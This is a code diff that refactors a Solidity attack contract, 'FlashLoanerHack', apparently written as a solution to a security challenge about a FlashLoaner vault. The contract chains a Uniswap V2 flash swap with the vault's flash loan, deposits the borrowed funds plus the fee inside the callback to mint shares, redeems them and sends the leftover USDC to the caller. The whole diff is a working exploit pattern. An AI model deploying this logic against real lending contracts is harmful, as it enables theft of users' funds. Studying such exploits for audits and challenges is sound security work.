@@ -5,34 +5,35 @@ import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
 import "../flash-loaner/FlashLoaner.sol";
 
 contract FlashLoanerHack {
-    IUniswapV2Pair private immutable PAIR;
-    FlashLoaner private immutable FLASH_LOAN;
     uint256 private shares;
 
-    constructor(IUniswapV2Pair _pair, FlashLoaner _flashLoan) {
-        PAIR = _pair;
-        FLASH_LOAN = _flashLoan;
-    }
-
-    function run() external {
-        IERC20(PAIR.token0()).approve(address(FLASH_LOAN), type(uint256).max);
-        uint256 supply = FLASH_LOAN.totalAssets() - 1;
-        uint256 feeBasis = FLASH_LOAN.feeBasis();
+    function run(IUniswapV2Pair _pair, FlashLoaner _flashLoan) external {
+        IERC20(_pair.token0()).approve(address(_flashLoan), type(uint256).max);
+        uint256 supply = _flashLoan.totalAssets() - 1;
+        uint256 feeBasis = _flashLoan.feeBasis();
         uint256 fee = (supply * feeBasis) / 10000;
         uint256 swapAmount = supply + fee + 1;
-        PAIR.swap(swapAmount, 0, address(this), abi.encode(supply, msg.sender));
+        _pair.swap(
+            swapAmount,
+            0,
+            address(this),
+            abi.encode(supply, msg.sender, _flashLoan)
+        );
     }
 
     function uniswapV2Call(
-        address _sender,
+        address, /*_sender*/
         uint256 _amount0,
-        uint256 _amount1,
+        uint256, /*_amount1*/
         bytes calldata _data
     ) external {
-        (uint256 supply, address to) = abi.decode(_data, (uint256, address));
-        IERC20 usdc = IERC20(PAIR.token0());
-        FLASH_LOAN.flash(address(this), supply, abi.encode(supply));
-        FLASH_LOAN.redeem(shares, address(this), address(this));
+        (uint256 supply, address to, FlashLoaner flashLoan) = abi.decode(
+            _data,
+            (uint256, address, FlashLoaner)
+        );
+        IERC20 usdc = IERC20(IUniswapV2Pair(msg.sender).token0());
+        flashLoan.flash(address(this), supply, abi.encode(supply));
+        flashLoan.redeem(shares, address(this), address(this));
         uint256 repayAmount = calculateRepay(_amount0);
         usdc.transfer(msg.sender, repayAmount);
         usdc.transfer(to, usdc.balanceOf(address(this)));
@@ -40,7 +41,7 @@ contract FlashLoanerHack {
 
     function flashCallback(uint256 fee, bytes calldata data) external {
         uint256 supply = abi.decode(data, (uint256));
-        shares = FLASH_LOAN.deposit(supply + fee, address(this));
+        shares = FlashLoaner(msg.sender).deposit(supply + fee, address(this));
     }
 
     function calculateRepay(uint256 amount) private pure returns (uint256) {
